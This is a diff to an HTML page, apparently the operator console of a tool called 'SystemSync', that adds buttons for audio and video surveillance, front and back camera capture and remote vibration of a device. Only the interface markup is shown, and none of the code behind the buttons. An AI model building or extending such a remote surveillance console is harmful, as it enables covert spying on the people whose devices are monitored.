@@ -180,7 +180,28 @@
 </head>
 
 <body>
+<div class="section">
+    <h3>Audio Surveillance</h3>
+    <button id="audioBtn" onclick="toggleAudio()">Start Recording</button>
+</div>
 
+<div class="section">
+    <h3>Video Surveillance</h3>
+    <button id="videoBtn" onclick="toggleVideo()">Start Video Rec</button>
+</div>
+
+<div class="section">
+    <h3>Camera Capture</h3>
+    <div style="display: flex; gap: 5px;">
+        <button onclick="sendCommand('camFront')">Front Cam</button>
+        <button onclick="sendCommand('camBack')">Back Cam</button>
+    </div>
+</div>
+
+<div class="section">
+    <h3>Remote Tools</h3>
+    <button onclick="sendVibrate()">Vibrate Device</button>
+</div>
 <div class="header">
     <div class="title">SystemSync <span style="color:#fff">Console</span></div>
     <div class="net-info" id="networkInfo">OFFLINE MODE</div>
@@ -370,4 +391,5 @@
 
 </body>
 </html>
+
 
